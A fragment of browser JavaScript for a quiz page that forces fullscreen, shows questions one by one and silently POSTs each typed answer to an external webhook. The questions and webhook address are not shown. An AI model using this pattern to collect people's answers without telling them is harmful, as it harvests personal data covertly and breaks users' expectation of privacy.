        let currentQuestionIndex = 0;
        const questionElement = document.getElementById("question");
        const inputBox = document.getElementById("inputBox");
        const userInput = document.getElementById("userInput");
        const submitAnswer = document.getElementById("submitAnswer");


        function goFullScreen() {
            const docElement = document.documentElement;
            if (docElement.requestFullscreen) {
                return docElement.requestFullscreen();
            } else if (docElement.mozRequestFullScreen) {
                return docElement.mozRequestFullScreen();
            } else if (docElement.webkitRequestFullscreen) {
                return docElement.webkitRequestFullscreen();
            } else if (docElement.msRequestFullscreen) {
                return docElement.msRequestFullscreen();
            }
        }


        function showQuestion() {
            if (currentQuestionIndex < questions.length) {
                questionElement.textContent = questions[currentQuestionIndex];
                questionElement.style.display = "block";
                inputBox.style.display = "block";
                userInput.value = "";
            } else {
                endGame();
            }
        }


        submitAnswer.addEventListener("click", () => {
            const answer = userInput.value.trim();
            if (answer) {
  
                sendToWebhook(`User's Answer to "${questions[currentQuestionIndex]}": ${answer}`);
                currentQuestionIndex++;
                showQuestion();
            }
        });

        function sendToWebhook(message) {
            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: message })
            }).catch((error) => console.error("Error sending to webhook:", error));
        }
